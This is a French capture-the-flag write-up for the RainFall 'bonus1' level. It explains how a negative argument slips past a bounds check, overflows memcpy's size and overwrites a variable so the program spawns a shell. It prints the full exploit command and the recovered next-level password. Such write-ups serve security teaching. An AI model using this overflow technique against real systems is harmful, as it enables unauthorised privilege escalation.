# bonus1 : Exploitation d'un dépassement d'entier

## Présentation du défi

Le programme `bonus1` prend deux arguments : un nombre et une chaîne de caractères. Il y a une vérification qui limite le nombre à des valeurs inférieures à 10, mais en raison d'une vulnérabilité de dépassement d'entier, nous pouvons contourner cette vérification et déclencher un shell en manipulant la mémoire du programme.

## Analyse du code source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv)
{
  int result;
  char buffer[40];
  int number;
  
  number = atoi(argv[1]);
  if (number < 10) {
    memcpy(buffer, argv[2], number * 4);
    if (number == 0x574f4c46) {  // Valeur hexadécimale pour "FLOW" en little-endian
      execl("/bin/sh", "sh", NULL);
    }
    result = 0;
  }
  else {
    result = 1;
  }
  return result;
}
```

Le programme suit ce flux d'exécution :

1. Il prend le premier argument de ligne de commande et le convertit en entier avec `atoi()`
2. Il vérifie si ce nombre est inférieur à 10
3. Si c'est le cas, il copie `number * 4` octets du deuxième argument dans un buffer de 40 octets
4. Ensuite, il vérifie si `number` est égal à `0x574f4c46` (ASCII "FLOW" en little-endian)
5. Si cette condition est remplie, il lance un shell avec `execl()`

## Analyse de la vulnérabilité

La vulnérabilité dans ce programme repose sur deux problèmes clés :

1. **Vulnérabilité de dépassement d'entier** :
   - Quand un nombre négatif est fourni comme premier argument, il passera la vérification `number < 10`
   - Cependant, quand ce nombre négatif est multiplié par 4 et passé à `memcpy()`, un dépassement d'entier se produit
   - Comme le troisième paramètre de `memcpy()` (taille) est interprété comme une valeur non signée, un nombre négatif soigneusement choisi peut résulter en une valeur positive très grande ou spécifique

2. **Vulnérabilité de dépassement de tampon** :
   - Le tampon de destination ne fait que 40 octets
   - En exploitant le dépassement d'entier, nous pouvons faire écrire à `memcpy()` plus de 40 octets
   - Cela nous permet d'écraser la mémoire adjacente, y compris la variable `number` elle-même

3. **Disposition de la mémoire** :
   - Grâce au débogage, nous pouvons confirmer que la variable `number` est stockée immédiatement après le tableau `buffer` en mémoire
   - Cela signifie que les octets 40 à 43 dans notre dépassement écraseront la variable `number`

## Stratégie d'exploitation

Notre approche consiste à :

1. Utiliser un nombre négatif qui passe la vérification `number < 10`
2. S'assurer que ce nombre, lorsqu'il est multiplié par 4 et interprété comme non signé, égale exactement 44 (40 octets pour le buffer + 4 octets pour écraser `number`)
3. Créer une charge utile où les 4 derniers octets écraseront `number` avec `0x574f4c46` ("FLOW")
4. Lorsque la comparaison s'exécute, `number == 0x574f4c46` sera vrai, et nous obtiendrons un shell

## Calcul précis de l'entier

Nous avons besoin d'un entier négatif qui :
- Est inférieur à 10 (pour passer la vérification)
- Lorsqu'il est multiplié par 4 et interprété comme non signé, égale exactement 44

1. Nous devons trouver un nombre qui, lorsqu'il est multiplié par 4 et interprété comme non signé, égale 44 octets

2. Quand un nombre négatif est interprété comme non signé dans un système 32 bits, il boucle :
   - Pour une valeur négative -X, son interprétation non signée est (2^32 - X)

3. Appelons notre nombre cible n :
   - Quand n est multiplié par 4 : n * 4
   - Cela doit égaler 44 lorsqu'il est interprété comme non signé

4. En travaillant à rebours :
   - Nous avons besoin que (n * 4) interprété comme non signé = 44
   - Si n est négatif, alors (n * 4) est également négatif
   - Une valeur négative -X devient (2^32 - X) lorsqu'elle est interprétée comme non signée
   - Donc nous avons besoin de : 2^32 - (-n * 4) = 44
   - Simplification : 2^32 + 4n = 44
   - Par conséquent : 4n = 44 - 2^32
   - 4n = 44 - 4 294 967 296
   - 4n = -4 294 967 252
   - n = -4 294 967 252 ÷ 4
   - n = -1 073 741 813

Par conséquent, notre valeur cible est `-1 073 741 813`. Lorsque cette valeur est multipliée par 4, le résultat sera interprété comme exactement 44 octets par memcpy(), nous permettant de dépasser le tampon de la quantité exacte nécessaire pour écraser la variable number.

## Vérification avec GDB

Pour vérifier notre compréhension de la disposition mémoire, nous avons examiné le programme avec GDB :

```
(gdb) run 9 "AAAABBBBCCCCDDDDEEEEFFFFHHHHIIIIKKKKLLLLMMMMNNNNOOOO"
(gdb) x/40b $esp+0x14  # Examen du début du buffer
...
(gdb) x/44b $esp+0x14  # Examen du buffer + 4 octets supplémentaires
```

Cela a confirmé :
- Le buffer de 40 octets est rempli avec notre entrée
- Les octets 40-43 (qui débordent du buffer) écrasent la variable `number`
- Avec notre valeur calculée de `-1 073 741 813`, `memcpy()` copiera exactement 44 octets

## Exploit final

```bash
./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
```

Cet exploit :
1. Passe `-1 073 741 813` comme premier argument, ce qui :
   - Est négatif, donc il passe la vérification `number < 10`
   - Lorsqu'il est multiplié par 4, provoque un dépassement d'entier résultant en exactement 44 octets copiés
   
2. Le deuxième argument est :
   - 40 'A' pour remplir le buffer
   - Suivi par `\x46\x4c\x4f\x57` (FLOW en little-endian)
   
3. Après le `memcpy()` :
   - Le buffer est rempli avec 40 'A'
   - La variable `number` est écrasée avec `0x574f4c46`
   
4. La condition `number == 0x574f4c46` est évaluée à vrai, lançant un shell

## Obtention du mot de passe

Après avoir exécuté l'exploit, nous avons obtenu un shell avec les privilèges de bonus1 et récupéré le mot de passe :

```bash
bonus1@RainFall:~$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

## Passage au niveau suivant

Utilisez le mot de passe pour vous connecter en tant que `bonus2` et passer au défi suivant :

```bash
bonus1@RainFall:~$ su bonus2
Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
bonus2@RainFall:~$ 
```
